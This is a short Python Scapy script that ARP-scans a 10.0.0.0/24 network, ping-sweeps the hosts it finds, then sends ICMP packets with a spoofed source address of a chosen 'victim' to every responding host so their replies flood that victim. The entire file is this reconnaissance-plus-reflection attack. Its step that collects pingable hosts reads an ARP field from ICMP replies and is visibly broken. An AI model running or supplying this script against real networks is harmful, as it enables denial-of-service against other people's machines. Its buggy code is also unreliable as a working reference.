from scapy.all import * 
#this function sends an arp message and returns a list of answers
def activearp():
	ans,unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1,pdst='10.0.0.0/24'),timeout=1)
	return ans,unans
#this function gets every sniffed packet and prints the ones that are 'is at' messages
def pktparse(pkt):
	if pkt[ARP].op == 2:
		print('MAC:',pkt.hwsrc,'IP:',pkt.psrc)
#this function sniffs for arp messages
def passivearp():
	sniff(filter='arp', prn=pktparse)

#passivearp()

ans,unans = activearp()
print(ans.show())
#create a list of possible targets
targets=[]
for pkt in ans:
	targets.append(pkt[1][ARP].psrc)
print(targets)
#figure out which addresses are pingable
pingables=[]
ans,unans = sr(IP(dst=targets)/ICMP()/Padding('!@#$%^&*()'),timeout=2)
for pkt in ans:
	pingables.append(pkt[1][ARP].psrc)
#now we have to pick a victim and send from him pings to all the pingables 
#make sure to exclude the victim from the list
victim='10.0.0.31'
send(IP(src=victim,dst=pingables)/ICMP())


